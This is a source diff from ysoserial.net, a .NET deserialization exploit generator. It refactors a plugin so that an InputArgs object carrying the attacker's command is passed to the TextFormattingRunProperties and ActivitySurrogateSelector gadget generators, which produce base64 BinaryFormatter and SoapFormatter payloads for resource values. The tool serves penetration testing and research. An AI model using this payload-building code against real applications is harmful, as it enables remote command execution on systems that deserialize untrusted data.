@@ -58,10 +58,14 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
             }
             catch (OptionException e)
             {
@@ -151,7 +155,7 @@ namespace ysoserial.Plugins
                     if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
                     {
                         mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
-                        byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().Generate(command, "BinaryFormatter", false, minify, useSimpleType);
+                        byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                         payloadValue = Convert.ToBase64String(osf);
 
                     }
@@ -160,12 +164,12 @@ namespace ysoserial.Plugins
                     mtype = @"mimetype=""application/x-microsoft.net.object.soap.base64""";
                     if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "SoapFormatter", false, minify, useSimpleType);
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().GenerateWithNoTest("SoapFormatter", inputArgs);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     else
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().Generate("", "SoapFormatter", false, minify, useSimpleType);
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().GenerateWithNoTest("SoapFormatter", inputArgs);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     break;
